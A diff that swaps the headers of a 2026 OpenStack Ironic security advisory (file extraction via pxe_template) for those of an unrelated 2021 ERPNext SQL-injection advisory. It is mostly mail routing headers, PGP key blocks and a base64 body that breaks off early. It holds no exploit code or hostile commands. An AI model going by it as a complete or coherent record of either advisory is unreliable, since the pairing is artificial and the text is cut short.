@@ -1,4 +1,9 @@
-Received: (qmail 1687 invoked by uid 550); 3 Jun 2026 16:51:50 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6122" "Tuesday" "11" "May" "2021" "11:45:56" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "174" "[oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0" nil nil nil "5" nil nil (number mark "U       s.pietsch@tr May 11  174/6122  " thread-indent "\"[oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 27764 invoked by uid 550); 11 May 2021 11:57:08 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,380 +12,196 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 7922 invoked from network); 3 Jun 2026 16:29:26 -0000
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=kv6ryzSEHK/LlPL5cLbU42TwePS1Y1Lc6OScP2Hv7TlwcFVty57ChyK9WFXb4NbJLBzKtbHDBIPLjMjbwRLkjcqJakgdc5CuS5LNZtTwMhMD0dJdtG5Lae9TSEXhNKrAtl9K1fmroKglzcIM48F7Mjki40KyPSZ5jFxGoQ9nFKa06fIOwpUCK6kmZ3FzJ5GEMDzs3I2Ke7W44S9d8nlwXhL39C1kD0wJc+HmcCkIyDVcf3HgZXFkjlpg04LZRFr7CvkoQtDB7XSTzoojJnYEPLUExJYjGvx3eAxlqGkULR1NZ/GnjXXPmyHZk8U3jaxWSZ9wbX7FAYy80r839jQC+Q==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=ERg4Mmh8WOud6eSlmI/CFZ10ajXq8XQeET80M26Jqd0=;
- b=uEVxyOgdQV+4ym+g/01w5LSL3+ukL072lRXVmbrkC6uc83jXxuOzMUlRJNaJpy6rbYZ/zUPJAVSRKEzmwWmytEwrGE49dNBb8Xbt+9tvX+oAx9toYD2awjvfj+dT0Y/tWwE0KZBnXo4ReJSy09mcdSY/bb/B9aezDHLHpfov0q9m91rPB5p1wmhDZt3gx9VEtYWTD15sQ1JKs/Gqe47GiDec1zFoLLWzSCRG/DGYYI3hy5ToFCRCxSuO0Zu4Gg8Pziie1/zCtiYyyONTYekdKRVNOY4PYYq1E5Mz09gi70uuIucOCMhgbBXBV1mZG/qye2NFFH4vAr3/KcVeKJYHVw==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=jvf.cc; dmarc=pass action=none header.from=jvf.cc; dkim=pass
- header.d=jvf.cc; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=jvf.onmicrosoft.com;
- s=selector2-jvf-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=ERg4Mmh8WOud6eSlmI/CFZ10ajXq8XQeET80M26Jqd0=;
- b=lFQ1Fm2QKtJxDtMhXOofjMkLTY2+IXB5ezDQBCjCCLaukBNWppvumSUyWwqBwxfZHioVS55NdBwp5YjqRuXsUxCGWGPMCkwnuR14ASAEx340ZwPEYX1UX26x9g0rFG60yruzjQs4IETnFf47izLWxcxnLfk6u1GU50MRWL6dSyU=
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=jvf.cc;
-Message-ID: <f8e1b8e1-874a-4bc2-b0b2-5ac43cd3758a@jvf.cc>
-Date: Wed, 3 Jun 2026 09:29:13 -0700
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: oss-security@lists.openwall.com
-From: Jay Faulkner <jay@jvf.cc>
-Autocrypt: addr=jay@jvf.cc; keydata=
- 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
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="------------EXc6fZAy02UVaSfnoSY8t06A"
-X-ClientProxiedBy: BY3PR10CA0030.namprd10.prod.outlook.com
- (2603:10b6:a03:255::35) To CO6PR19MB5340.namprd19.prod.outlook.com
- (2603:10b6:303:137::10)
+Received: (qmail 21752 invoked from network); 11 May 2021 11:46:10 -0000
+Date: Tue, 11 May 2021 11:45:56 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
+	s=protonmail3; t=1620733559;
+	bh=VUp3W1DKEFFSPnRnZWW5KHoUeqVZ3RodprBKDzT18NU=;
+	h=Date:To:From:Reply-To:Subject:From;
+	b=beiGs+7pnaGdlXbHNLdqC5nV8q7WtLaiKvCDdu3ZsRg9iVnY+C+mx3FMntuQtW8gB
+	 V7d4PTgpbdyEBDViyaOs9nTWxgXCwf4IGmiR/x9atU54qASdLSJOI5J/w6m0ZrWzKV
+	 5HVTk8965rX/Nn4sJzteSSH4ON1CuyFQcnCP5iIE+4ID06FBuKJsOV0N+423z6Qmjw
+	 0vew5H4P2BuKj0B/GSSpQODaySBDPBeiGvnSMCInev4aI1vqhrz/wvFvHULYiycjEc
+	 1SBQdCgt0C7tDVfzBjjfSVKIqYi5H3GzLdoKifCfNFndzZwzetBaCz06EjRApq3gXG
+	 X4m3OFnAOYDnQ==
+To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
+From: Stefan Pietsch <s.pietsch@trovent.io>
+Message-ID: <IV6PM0BF5xvdzKqp9Gl1kRbVbEwYHfBEis05qRSkaueB_f4cQIXWBj1jnUqgcX6lQ3ezklmmLiAv-y93PQVQwzIGIcu46GPqBbu57QP8nkI=@trovent.io>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: CO6PR19MB5340:EE_|PH7PR19MB7099:EE_
-X-MS-Office365-Filtering-Correlation-Id: 5650e8f0-dc98-47d4-1862-08dec18d400d
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam:
-	BCL:0;ARA:13230040|376014|366016|6049299003|10070799003|19092799006|1800799024|56012099006|6133799003|18002099003|4133799003|4053099003;
-X-Microsoft-Antispam-Message-Info:
-	+FKQ6yJYJCc8VIDB7nacZU7Vpj6m5TwzJIOrm3KNpYrdhOWqEZKz7PvcGkkFelJMaNqLyJ3zrCGBS3UQdbDK0hTiquPXmfHWXUA7Ygp79+hZOTgjoBbapmGlazH/fSfeZuRudTjDQP+RVJ9rMbhPbokopDoxCj7cVj+CncA0gBKb3UH02yfqRUHVdSzLIO8hAM1EbI/pyNzD2Fy2mq30r5wcYYhM5Xhxvel5RO2AJv4ET2mLdWv3KtcOWtQ0eQ1kpRKGt2zHCZZFa52ckUWismdvDWEjpiRg3qaFDE8ZIuC9BYIVaqxhI79qefe4SnKX4QUkg0Ayr0VR6i6a9uIALphszTxD8bQC/7yrE71Kp5Idnyox4cKh9fxFil0LmULWq4M9jWPJ/2EIo7M4Ig8G1dJE4uv/9iFQOdmUa+svA7slHzmLQqI0Mo209mGtrIA7MhSJHpNcy5ci8zkYVZr9Zmfq6RG9NUgObBO2r+ALvUB+HpNGSQHcGYTsJM98sg0QPrEur8AM0tCFvtTvto07jiJxuBgHHnq4XRfsUs1JggWX65RSD9TMlmNeNZRa9+CEEUen+bD7aWCQHQtMGYJDVo8mHOI/MG/gcZ98m9Ird0SwmXgi+Vq247uSeZhDh6SL6WDWoznJZOq+JR2KCgrd4g==
-X-Forefront-Antispam-Report:
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CO6PR19MB5340.namprd19.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(366016)(6049299003)(10070799003)(19092799006)(1800799024)(56012099006)(6133799003)(18002099003)(4133799003)(4053099003);DIR:OUT;SFP:1102;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0:
-	=?utf-8?B?WlRLdlRPWUFMN1VTYmtCcDRCMWVWc0E2S3YvLzIyRGl0b1orelJUSTBsbmFB?=
- =?utf-8?B?ZmhxQmVKWnNKRnRpaWdNNFl5Z2R3eHpzc0hPekJsamRTNW9MZGRzTzVLTE82?=
- =?utf-8?B?aDRzZytkMVkzVDFsNm9BU2p1V2lzNXhYU2dhcXJ4WjllaVVEV0NPSU9WUmJF?=
- =?utf-8?B?czE1VjFvbDBqV1Q4em5RbExYTkd5UkhGTXVlc3lNYksxU2lmNjNabmQ5YTlq?=
- =?utf-8?B?WTg1SHJHeDQ3TUFhbUFXNVY5dGY2RGpnZWg3N1JBeHZnZSt0eWYxWmw3UVRy?=
- =?utf-8?B?d1R4Mm1NVm95TlRoTmdPTzhFUzVGWkI4ME9obmNIQ2poSWpnUnJkbXR4M08y?=
- =?utf-8?B?c050ak9CWFgvUVFkK0E2cWUvT2gvTGdyeHZHN0dhWEkvUitiK2hyWnJCa0tx?=
- =?utf-8?B?eU1DanREdnN5UkRtMVp5MDl1M2ZaZ2xwdGxRK2l2ZnRqM0MwcmNvRmpjb2JO?=
- =?utf-8?B?Rk9HZnNRaTU1c0Q3NUJMY1dyWmhESExSalAxSUUwVDRYZXljWUU1SkFBcVhv?=
- =?utf-8?B?d2dqcWE1QmUramlyNUkrdkIranVMNnV3dGlJTW85Qk14blZQWnVvb2xUNm9R?=
- =?utf-8?B?VjlGVGwyUXhySkJuZld1R2p3R25hRVNOaHJ2NStyYWpUMEV0RStBMVFlOGpN?=
- =?utf-8?B?NFBLQ3hPTkJUdlRIYlF2cXJZTFYvLzRuQjRQdDFLNWJ4ZGhZd0NjRFNGbTZY?=
- =?utf-8?B?UHJLRTZvbko3dzFCWUhURmVhZEJpa2RLZklNaXJTb3NNeVhkZXkxL0ZEOUJS?=
- =?utf-8?B?LzRQdkFaUWRGYm16ZURhY29tZGZpQVBqbDBaTURYN2ZDNnFDNTU5czJUNEtZ?=
- =?utf-8?B?eGUydXVORFBITVNYWWtlOWJiUUxMc2luM1UvV0gzRndCZUJkbGtkLzdOUnRl?=
- =?utf-8?B?ZDNhMjhWQXlOeWRwM3RhQURMR2ZreEROeUcvN1NweFZlMzZYbmxuZGZXK09h?=
- =?utf-8?B?RTFtdHJMR3RSRGJQQTFuTDZKSlI1VWR2dnRVSkp0L29qREhLUGVkZGZIbU9r?=
- =?utf-8?B?dCtEdXdFQVlmbWthSm5DbTlJVEtkYURSZnVhS2RIR0ZkcERlNWlmMnJqK3hw?=
- =?utf-8?B?SG5HT1lxM28vZlJhc0JYdFpCVVN6YWo5b0FoRWJ2d0E1Uk5RWk53S0NVWWFo?=
- =?utf-8?B?OTljREJ1eEhRbml5cGVVbjN5MXM5dzYyYkpkN21tTHA1YUdCR1YxUG4wT1hw?=
- =?utf-8?B?aDlnMjU3Um15ZlJmMXZQbWZUWHlrYU43S0hpOWpEa29sSWxRdElaNnRJa3lq?=
- =?utf-8?B?dmFkMTZrcFRXak4wT3NGWHZZNVpNc2Jnb1RydTBWM05Hck1FSzN2UDZpN2lZ?=
- =?utf-8?B?ejRuNmR6MS9XZUZCKzcxR1M4ellkeTlCMlBBVlBoMVBqTlFOYlNkQ2JJc3hs?=
- =?utf-8?B?SWwzUmExamVFSFk1NzUvODRHWjdjQmRqT0xtUjdTT3ZGME1DY1RtYU55Z29l?=
- =?utf-8?B?clRFdEE4U2VPeEM0dHFrNlY1aWJSTnlxUzVGd3pIaGV1L1FGRDZYNzUwNWZp?=
- =?utf-8?B?V3Y2UjV6TUdWMHphZHhVcE9pNmxoSEUxRnZxTllUeXROVEIyM29ZNTI5Mjkx?=
- =?utf-8?B?ZzN6NFc0Nkp1K1pCSkFUOUY4Uzh6N2RtRVVUOU1ubUF1VjBGZ0plU2VxSTN6?=
- =?utf-8?B?ZmcySTRITUdHRVp0c25oTmgweTcyU21JendGekhKcWI2S1gwaFRMMlBHczE4?=
- =?utf-8?B?MWNrSGsyNWwrWHNaaUtjRnZJd1lISmk3TEVMWVVSZUFmaVl3TElpcEtQS0oy?=
- =?utf-8?B?aHZTSE1PbnBNeEdqTjN2eHp4TjBXb042RDgzRndoaTdERTB3T2hWN2V1Wm5p?=
- =?utf-8?B?R2hsT3FGSkpYdS82SHlaaElxZUpzU3BUcXNlMFYxS0RHTWNjL25OUk5aQmFU?=
- =?utf-8?B?S1FDRGpzekFibW9FOXBnKzJaRm03Snljb2NJaUxHanV2U1N1QXZHS1diQmtW?=
- =?utf-8?B?ZmYzV1o5RmViTkZBL1p5Q0NLSUFXcVo4eVNaVGFza3FRM1F3NU4zd3hCV2R6?=
- =?utf-8?B?T1h6aFQxVFVVblpaYlAxbGZDb0grUU1jUEVmMEQ4dTkwVDJxcW5IMmhZcnY5?=
- =?utf-8?B?NmYxaUxZYS9OK2ZodTFZZk1RR2w1ZmJzQVg5ZVVZMWlUdmtEQkRWMW5XZmMr?=
- =?utf-8?B?WnR4RFcyNGJQbjFyRFBjS1FGb0ZvSHZPbGU4NlNCdmh2N1hjSXJGditFM3Bs?=
- =?utf-8?B?ZnFjNjY3NHduRmh4c1BaZWZMdGZWM1NBb3dpOE0zekVCVGQ4ZHVVS01GNWgr?=
- =?utf-8?B?ZzlzTit4RUo4NzRFNTBTNWQ4cDJ3ZG0xemZZQ2NndVZmcC8yK0t4MmNUNVRv?=
- =?utf-8?B?VkxFRHVkUzBsc0ZYaktJZEVWM0NKYTZQSkR4Qkcya2k2aWF3VXorL0F1Z0da?=
- =?utf-8?Q?gx/vsarvTNGSsZNPH2k/AfW2psVHBgJl+bTxT?=
-X-OriginatorOrg: jvf.cc
-X-MS-Exchange-CrossTenant-Network-Message-Id: 5650e8f0-dc98-47d4-1862-08dec18d400d
-X-MS-Exchange-CrossTenant-AuthSource: CO6PR19MB5340.namprd19.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 Jun 2026 16:29:14.3416
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 3268b97a-2d09-45a8-9816-8dea1f44039e
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: hUqLePPKJqbZbJrGkFVMxPkHNH6kZb9/0ddUyGkytdgrWw3cz/fTLf9IdyhV7TsA
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH7PR19MB7099
-Subject: [oss-security] [OSSA-2026-019] Ironic: File Extraction from conductor via
- pxe_template (CVE-2026-44917)
+Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------b87c392d4e73cb771de7a3755745f6e3"; charset=utf-8
+Subject: [oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0
 
---------------EXc6fZAy02UVaSfnoSY8t06A
-Content-Type: multipart/mixed; boundary="------------85900kXHvSXpfJ4CQ2jKwslx";
- protected-headers="v1"; hp="clear"
-Message-ID: <f8e1b8e1-874a-4bc2-b0b2-5ac43cd3758a@jvf.cc>
-Date: Wed, 3 Jun 2026 09:29:13 -0700
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: oss-security@lists.openwall.com
-From: Jay Faulkner <jay@jvf.cc>
-Subject: [OSSA-2026-019] Ironic: File Extraction from conductor via
- pxe_template (CVE-2026-44917)
-Autocrypt: addr=jay@jvf.cc; keydata=
- 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
+-----------------------b87c392d4e73cb771de7a3755745f6e3
+Content-Type: multipart/mixed;boundary=---------------------4f1c175b1982d7f9ca2407db5f41036b
 
---------------85900kXHvSXpfJ4CQ2jKwslx
-Content-Type: multipart/mixed; boundary="------------LBCVECTf6Od08JZLbdP0gJVE"
-
---------------LBCVECTf6Od08JZLbdP0gJVE
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: base64
-
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09DQpPU1NBLTIwMjYtMDE5OiBGaWxlIEV4dHJhY3Rpb24gZnJvbSBJcm9uaWMg
-Y29uZHVjdG9yIHZpYSBweGVfdGVtcGxhdGUNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQo6RGF0ZTogSnVuZSAw
-MywgMjAyNg0KOkNWRTogQ1ZFLTIwMjYtNDQ5MTcNCg0KDQpBZmZlY3RzDQp+fn5+fn5+DQotIEly
-b25pYzogPj0xNy4wLjAgPDI2LjEuNywgPj0yNy4wLjAgPDI5LjAuNiwgPj0zMC4wLjAgPDMyLjAu
-MiwgPj0zMy4wLjAgDQo8MzUuMC4yDQoNCg0KRGVzY3JpcHRpb24NCn5+fn5+fn5+fn5+DQpEbWl0
